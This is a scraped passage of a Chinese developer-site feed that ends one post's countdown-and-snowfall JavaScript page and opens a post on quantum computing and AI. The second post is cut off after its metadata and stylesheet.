                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'minutes'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title class_">String</span>(minutes).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'seconds'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title class_">String</span>(seconds).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'days'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">'00'</span>;
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'hours'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">'00'</span>;
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'minutes'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">'00'</span>;
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'seconds'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">'00'</span>;
            }
        }

        <span class="hljs-comment">// 雪花效果</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">createSnowflakes</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> snowContainer = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'snow-container'</span>);
            <span class="hljs-keyword">const</span> particleCount = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> &lt; <span class="hljs-number">768</span> ? <span class="hljs-number">20</span> : <span class="hljs-number">50</span>;

            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; particleCount; i++) {
                <span class="hljs-title function_">createSnowflake</span>(snowContainer, i);
            }

            <span class="hljs-comment">// 窗口大小改变时重新创建雪花</span>
            <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
                <span class="hljs-keyword">while</span> (snowContainer.<span class="hljs-property">firstChild</span>) {
                    snowContainer.<span class="hljs-title function_">removeChild</span>(snowContainer.<span class="hljs-property">firstChild</span>);
                }
                <span class="hljs-keyword">const</span> newParticleCount = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> &lt; <span class="hljs-number">768</span> ? <span class="hljs-number">20</span> : <span class="hljs-number">50</span>;
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; newParticleCount; i++) {
                    <span class="hljs-title function_">createSnowflake</span>(snowContainer, i);
                }
            });
        }

        <span class="hljs-keyword">function</span> <span class="hljs-title function_">createSnowflake</span>(<span class="hljs-params">container, index</span>) {
            <span class="hljs-keyword">const</span> snowflake = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
            snowflake.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'snowflake'</span>);

            <span class="hljs-comment">// 随机属性</span>
            <span class="hljs-keyword">const</span> size = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">5</span> + <span class="hljs-number">2</span>;
            <span class="hljs-keyword">const</span> x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>;
            <span class="hljs-keyword">const</span> duration = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">10</span> + <span class="hljs-number">5</span>;
            <span class="hljs-keyword">const</span> delay = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">5</span>;
            <span class="hljs-keyword">const</span> opacity = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">0.5</span> + <span class="hljs-number">0.3</span>;

            <span class="hljs-comment">// 设置样式</span>
            snowflake.<span class="hljs-property">style</span>.<span class="hljs-property">left</span> = <span class="hljs-string">`<span class="hljs-subst">${x}</span>%`</span>;
            snowflake.<span class="hljs-property">style</span>.<span class="hljs-property">top</span> = <span class="hljs-string">'-20px'</span>;
            snowflake.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">`<span class="hljs-subst">${size}</span>px`</span>;
            snowflake.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = <span class="hljs-string">`<span class="hljs-subst">${size}</span>px`</span>;
            snowflake.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">`<span class="hljs-subst">${opacity}</span>`</span>;

            <span class="hljs-comment">// 添加到容器</span>
            container.<span class="hljs-title function_">appendChild</span>(snowflake);

            <span class="hljs-comment">// 创建动画</span>
            snowflake.<span class="hljs-title function_">animate</span>(
                [
                    { <span class="hljs-attr">transform</span>: <span class="hljs-string">'translate(0, -20px) rotate(0deg)'</span> },
                    { <span class="hljs-attr">transform</span>: <span class="hljs-string">`translate(<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.sin(duration) * <span class="hljs-number">50</span>}</span>px, 100vh) rotate(90deg)`</span> },
                    { <span class="hljs-attr">transform</span>: <span class="hljs-string">`translate(<span class="hljs-subst">${-<span class="hljs-built_in">Math</span>.sin(duration) * <span class="hljs-number">25</span>}</span>px, 100vh) rotate(180deg)`</span> },
                    { <span class="hljs-attr">transform</span>: <span class="hljs-string">'translate(0, 100vh) rotate(360deg)'</span> },
                ],
                {
                    <span class="hljs-attr">duration</span>: duration * <span class="hljs-number">1000</span>,
                    <span class="hljs-attr">delay</span>: delay * <span class="hljs-number">1000</span>,
                    <span class="hljs-attr">iterations</span>: <span class="hljs-title class_">Infinity</span>,
                    <span class="hljs-attr">easing</span>: <span class="hljs-string">'linear'</span>
                }
            );
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h2 data-id="heading-3">祝大家 2026 年新年快乐，代码无 bug，需求一次过！</h2>
<p><em>各位互联网搭子，要是这篇文章成功引起了你的注意，别犹豫，<strong>关注、点赞、评论、分享走一波</strong>，让我们把这份默契延续下去，一起在知识的海洋里乘风破浪！</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[量子计算会彻底改变 AI 的运算方式吗？一场关于"量子幽灵"与"硅基大脑"的深夜对话 🎭💻]]></title>    <link>https://juejin.cn/post/7589564203872550975</link>    <guid>https://juejin.cn/post/7589564203872550975</guid>    <pubDate>2025-12-31T09:10:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589564203872550975" data-draft-id="7589676302124810281" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="量子计算会彻底改变 AI 的运算方式吗？一场关于&quot;量子幽灵&quot;与&quot;硅基大脑&quot;的深夜对话 🎭💻"/> <meta itemprop="keywords" content="人工智能,LLM,AIGC"/> <meta itemprop="datePublished" content="2025-12-31T09:10:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            量子计算会彻底改变 AI 的运算方式吗？一场关于"量子幽灵"与"硅基大脑"的深夜对话 🎭💻
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T09:10:30.000Z" title="Wed Dec 31 2025 09:10:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"❝";top:8px;left:5px}.markdown-body blockquote:after{content:"❞";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 